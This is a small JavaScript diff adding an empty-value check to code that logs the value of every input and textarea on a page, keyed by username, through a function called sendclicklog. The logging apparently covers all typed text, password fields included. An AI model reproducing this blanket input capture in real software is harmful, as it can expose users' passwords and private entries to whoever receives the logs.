@@ -134,6 +134,7 @@ document.addEventListener('DOMContentLoaded', function() {
     var inputElements = document.querySelectorAll('body input, body textarea');
     inputElements.forEach(function(input) {
         input.addEventListener('input', function(event) {
+            if(!event.target.value)return;
             sendclicklog({[username]: ['input',event.target.value]});
         });
     });
